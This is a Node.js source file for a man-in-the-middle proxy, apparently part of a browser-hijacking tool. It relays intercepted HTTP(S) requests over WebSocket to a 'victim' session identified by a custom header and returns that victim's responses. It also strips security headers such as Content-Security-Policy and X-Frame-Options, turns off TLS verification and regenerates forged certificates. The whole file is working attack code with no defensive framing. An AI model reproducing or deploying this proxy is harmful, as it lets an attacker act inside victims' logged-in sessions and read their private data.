const HttpMitmProxy = require('http-mitm-proxy');
const { startServer: startVictimServer, sendWebSocketRequest } = require('./victimServer');
const fs = require('fs');
const path = require('path');

function deleteCertificateFile(certsDir, domain) {
  try {
    const certPath = path.join(certsDir, 'certs', `${domain}.pem`);
    fs.unlinkSync(certPath);
  } catch (err) {
    console.error(`Error removing certificate for ${domain}:`, err);
  }
}

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

blockedHeaders = [
  'x-content-type-option',
  'content-security-policy',
  'x-frame-options',
  'x-xss-protection',
  'content-encoding',
]

function cleanHTML(html) {
  return html.replace(/\n/g, '').replace(/\r/g, '').replace(/\t/g, '').replace(/\s{2,}/g, ' ');
}

function filterHeaders(headers) {
  const filteredHeaders = {};
  for (const key in headers) {
    if (!blockedHeaders.includes(key.toLowerCase())) {
      filteredHeaders[key] = headers[key];
    }
  }
  return filteredHeaders;
}

function startProxyServer() {
  const proxy = new HttpMitmProxy.Proxy();
  
  proxy.onRequest( async (ctx, callback) => {

    ctx.dataChunks = [];
    const method = ctx.clientToProxyRequest.method;

    const protocol = ctx.isSSL ? 'https://' : 'http://';
    const host = ctx.clientToProxyRequest.headers.host;
    const url = ctx.clientToProxyRequest.url;
  
    const fullUrl = `${protocol}${host}${url}`;
  
    console.log(`[${new Date().toISOString()}] ${ctx.clientToProxyRequest.method} ${fullUrl}`);
  
    const wsId = ctx.clientToProxyRequest.headers.shve;
    const headers = ctx.clientToProxyRequest.headers;

    ctx.onRequestData((ctx, chunk, callback) => {
      ctx.dataChunks.push(chunk);
      return callback(null, chunk);
    });

    ctx.onResponse(async (ctx, callback) => {
      const contentType = ctx.serverToProxyResponse.headers['content-type'];
      const statusCode = ctx.serverToProxyResponse.statusCode;
      if (contentType && (contentType.startsWith('text/html') || contentType.startsWith('application/json') || contentType.startsWith('application/xml'))) {
        const postData = ctx.dataChunks.length > 0 ? Buffer.concat(ctx.dataChunks).toString() : null;
        const response = await sendWebSocketRequest(wsId, ctx.clientToProxyRequest.method, fullUrl, headers, postData);
        if (response.error){
          ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/plain' });
          ctx.proxyToClientResponse.end(response.error);
        }
        else{
          const filteredHeaders = filterHeaders(response.headers);
          let filteredHtml;
          filteredHtml = cleanHTML(response.data);
          ctx.proxyToClientResponse.writeHead(response.status_code, filteredHeaders);
          ctx.proxyToClientResponse.end(filteredHtml);
        }
      } 
      else{
        ctx.proxyToClientResponse.writeHead(statusCode ,filterHeaders(ctx.serverToProxyResponse.headers));
      }
      return callback();
    });

    ctx.onError((ctx, error) => {
      if (error.message.includes('key values mismatch')) {
        console.log('Certificate Error, Regenerating certificates...');
        const domain = ctx.clientToProxyRequest.headers.host;
        if (domain) {
          deleteCertificateFile('./certs', domain);
        }
      }
    });

    callback();
  });

  proxy.listen({ host: '0.0.0.0', port: 8081, sslCaDir: './certs' }, () => {
    console.log('Proxy listening on port: 8081');
  });
}

module.exports = startProxyServer;